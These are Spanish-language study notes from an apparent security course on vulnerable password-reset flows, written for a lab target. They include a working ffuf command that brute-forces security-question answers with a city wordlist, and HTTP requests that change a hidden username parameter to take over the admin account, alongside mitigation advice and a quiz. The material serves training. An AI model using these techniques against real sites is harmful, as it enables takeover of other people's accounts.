# Módulo 08 — Broken Authentication

## Sección 9/14: Vulnerable Password Reset

> [!NOTE]
> Aunque haya rate limiting y CAPTCHA, bugs de lógica de negocio en el reset pueden seguir permitiendo tomar cuentas ajenas: preguntas de seguridad adivinables y manipulación de parámetros ocultos.

## 🛠️ Preguntas de seguridad adivinables

> [!WARNING]
> Si la app usa preguntas predefinidas y genéricas, todos los usuarios comparten el mismo tipo de pregunta — obtenible vía OSINT o adivinable.

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt
# 26468

ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" \
  -d "security_response=FUZZ" \
  -fr "Incorrect response."
```

> [!TIP]
> Reduciendo el espacio con OSINT (ej. sabiendo que es de Alemania):
> ```bash
> cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
> # 1117 en vez de 26468
> ```

## 🛠️ Manipulación del request de reset (parámetro username oculto)

Flujo de 3 pasos, cada uno con `username` viajando como parámetro oculto:

```http
POST /reset.php          → username=htb-stdnt
POST /security_question.php → security_response=London&username=htb-stdnt
POST /reset_password.php    → password=P@$$w0rd&username=htb-stdnt
```

> [!WARNING]
> Si la app no verifica que el username coincida entre pasos, se puede responder la propia pregunta y luego cambiar `username` en el paso final:
> ```http
> POST /reset_password.php
> password=P@$$w0rd&username=admin
> ```

> [!TIP]
> Mitigación: mantener un estado consistente durante todo el flujo, ligado criptográficamente a la misma sesión.

## 🧠 Quiz de repaso

<details>
<summary>¿Por qué preguntas de seguridad genéricas son más débiles que preguntas personalizadas?</summary>

Porque el espacio de respuestas posibles es finito y conocido de antemano, permitiendo un wordlist genérico aplicable a cualquier usuario de la plataforma.

</details>

<details>
<summary>¿Por qué la manipulación de parámetros es más grave que las preguntas adivinables?</summary>

Porque elimina por completo la necesidad de interactuar con los datos reales de la víctima — revela un fallo de diseño más fundamental: la app no verifica identidad de forma consistente a través del flujo.

</details>

> [!NOTE]
> **Ejercicio práctico (lab)** — El lab pide identificar la ciudad del admin y resetear su password. Metodología: iniciar reset con `admin`, brute-force de la respuesta con ffuf y wordlist de ciudades.

## 🔗 Relacionado
- [05 — Brute-Forcing Password Reset Tokens](05-brute-forcing-password-reset-tokens.md)
- [08 — Default Credentials](08-default-credentials.md)

#cwes #modulo08 #broken-authentication #password-reset #security-questions #business-logic #idor
